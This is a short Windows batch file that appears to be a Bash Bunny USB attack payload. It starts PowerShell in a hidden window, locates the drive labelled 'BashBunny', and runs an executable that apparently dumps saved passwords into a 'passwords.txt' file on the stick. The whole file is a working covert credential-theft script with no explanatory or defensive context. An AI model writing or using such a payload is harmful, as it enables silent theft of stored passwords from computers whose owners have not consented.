@echo off
start /b /wait powershell.exe -nologo -WindowStyle Hidden -sta -command "$usbPath = Get-WMIObject Win32_Volume | ? {$_.Label -eq 'BashBunny' } | select name";sleep -m 250;cd $usbPath.name;sleep -m 250;cd .\payloads\switch1\;sleep -m 250; ./a.exe /stext passwords.txt
@exit
